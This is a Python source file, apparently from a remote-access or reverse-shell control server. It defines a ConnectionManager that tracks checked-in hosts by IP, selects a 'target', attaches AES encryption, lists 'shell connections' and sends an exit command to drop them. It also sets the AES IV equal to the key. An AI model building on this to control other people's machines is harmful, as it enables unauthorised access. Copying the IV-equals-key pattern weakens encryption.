from os import urandom
from .Connection import Connection
import json
from hashlib import sha1


class ConnectionManager(object):

    def __init__(self):
        self.connections = {}
        self.connectedObjects = {}
        self.connctTo = None
        self.keys = []

    def insertNewConnction(self, conn, clientInfo):
        ip = conn.getpeername()[0]
        if ip not in self.connections.keys(): 
            self.connections[ip] = self._parseClientInfo(clientInfo)

    def connectToTarget(self,conn):
        conn.send(urandom(16))
        ip = conn.getpeername()[0]
        name = self.connections[ip]['Hostname']
        self.connections[ip]['connected'] = True
        self.connectedObjects[ip] = Connection(conn=conn,hostname=name,ip=ip)
        self.connctTo = None


    def _parseClientInfo(self,clientInfo):
        return {**{'connected': False},**json.loads(clientInfo)}
    

    def addAesToconnection(self,conn, aesObj):
        aesObj.set_iv(aesObj.key)
        self.connectedObjects[conn.getpeername()[0]].aes = aesObj
        self.keys.append(sha1(aesObj.key))

    def removeConnection(self,conn):
        del self.connections[conn.getpeername()]
        
    def getFixedConnection(self,conn):
        return self.connectedObjects[conn.getpeername()[0]]
    
    def isconnected(self,ip):
        if ip not in self.connections.keys():
            return False
        return self.connections[ip]['connected']
    
    def getConnObj(self,ip) -> Connection:
        return self.connectedObjects[ip]
    
    def alive(self,ip):
        return ip in self.connections.keys()
    
    def getShellConntions(self):
        return {
            self.connectedObjects[i].ip: self.connectedObjects[i].hostname
            for i in self.connectedObjects.keys()
        }
    
    def disconnect(self,ip):
        if ip in self.connectedObjects.keys():
            self.getConnObj(ip).sendMsg(b'exit')
            del self.connectedObjects[ip]
        self.connections[ip]['connected'] = False
        

